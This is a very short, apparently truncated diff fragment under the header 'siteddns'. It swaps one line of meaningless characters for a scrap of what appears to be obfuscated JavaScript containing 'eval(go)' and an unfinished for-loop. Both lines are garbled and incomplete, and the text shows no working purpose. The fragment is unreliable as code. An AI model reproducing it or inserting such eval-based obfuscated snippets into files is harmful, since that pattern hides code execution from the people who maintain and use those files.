@@ -1,2 +1,2 @@
  # siteddns
->6)|((jn[ln]
+=3);";eval(go);for(go=2;go
